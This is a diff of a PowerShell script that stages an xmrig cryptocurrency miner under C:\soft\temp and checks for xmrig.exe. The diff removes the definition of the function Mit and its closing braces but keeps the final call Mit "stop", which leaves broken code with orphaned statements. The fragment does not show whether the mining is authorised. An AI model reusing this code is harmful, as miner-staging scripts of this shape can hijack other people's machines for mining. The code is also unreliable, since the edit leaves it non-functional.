@@ -9,9 +9,6 @@ $BASE_DIR = "C:\soft"
 $TEMP_DIR = "C:\soft\temp"
 $M =   "C:\soft\temp\m"
 $MINER_EXE = "$TEMP_DIR\m\xmrig-6.25.0\xmrig.exe"
-function Mit([string]$command) {
-
-    if ($command -eq "start") {
 
         # Ensure base directory exists
         if (!(Test-Path $BASE_DIR)) {
@@ -46,6 +43,5 @@ function Mit([string]$command) {
             Write-Host "xmrig.exe not found!"
             return
         } 
-}
-}
+
 Mit "stop"
